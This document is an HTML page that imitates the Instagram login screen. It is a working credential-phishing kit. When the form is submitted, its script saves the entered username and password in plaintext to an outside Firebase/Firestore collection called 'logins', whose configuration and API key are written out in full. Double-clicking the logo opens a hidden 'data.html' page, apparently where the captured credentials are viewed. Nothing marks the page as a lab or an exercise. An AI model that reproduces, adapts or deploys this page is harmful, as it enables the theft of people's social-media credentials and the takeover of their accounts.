<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
      background-color: #000; /* Black theme */
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    .logo {
      width: 200px;
      height: 80px;
      margin-bottom: 30px;
      background-image: url('https://www.vecteezy.com/png/42127166-instagram-logo-on-square-style-with-transparent-background');
      background-size: contain;
      background-repeat: no-repeat;
      background-position: center;
      cursor: pointer;
      opacity: 1;
      z-index: 1;
    }
    .login-form {
      width: 100%;
      max-width: 350px;
      padding: 20px;
      border-radius: 4px;
      box-shadow: 0 1px 2px rgba(0,0,0,0.1);
      background-color: #000; /* Black theme */
      margin-top: 20px;
      border: 1px solid #262626;
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #fff; /* White text */
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border: 1px solid #262626;
      border-radius: 3px;
      background-color: #1c1c1c;
      color: #fff;
    }
    button {
      width: 100%;
      padding: 8px;
      background-color: #0095f6;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    @media (max-width: 480px) {
      .logo {
        width: 150px;
        height: 60px;
      }
      .login-form {
        width: 90%;
      }
    }
  </style>
</head>
<body>
  <div class="logo" id="instagramLogo"></div>
  <div class="login-form">
    <h2>Login</h2>
    <form id="loginForm">
      <input type="text" id="username" placeholder="Phone number, username, or email" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Log in</button>
    </form>
  </div>

  <script type="module">
    // Firebase configuration
    const firebaseConfig = {
      apiKey: "AIzaSyAVeEjtLg68DEK-dNtAHN5JFOy1NaevVjA",
      authDomain: "my-project-1-7e614.firebaseapp.com",
      projectId: "my-project-1-7e614",
      storageBucket: "my-project-1-7e614.firebasestorage.app",
      messagingSenderId: "807664093949",
      appId: "1:807664093949:web:98b8505fa2277371938c94",
      measurementId: "G-8DFGXF1QWX"
    };

    // Initialize Firebase
    import { initializeApp } from 'https://www.gstatic.com/firebasejs/12.8.0/firebase-app.js';
    import { getFirestore, addDoc, collection } from 'https://www.gstatic.com/firebasejs/12.8.0/firebase-firestore.js';

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    let clickCount = 0;
    document.getElementById('instagramLogo').addEventListener('dblclick', () => {
      clickCount++;
      if (clickCount >= 2) {
        window.open('data.html', '_blank');
        clickCount = 0;
      }
    });

    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      try {
        await addDoc(collection(db, "logins"), { username, password });
        alert("Data sent successfully!");
      } catch (error) {
        console.error("Error:", error);
      }
    });
  </script>
</body>
</html>
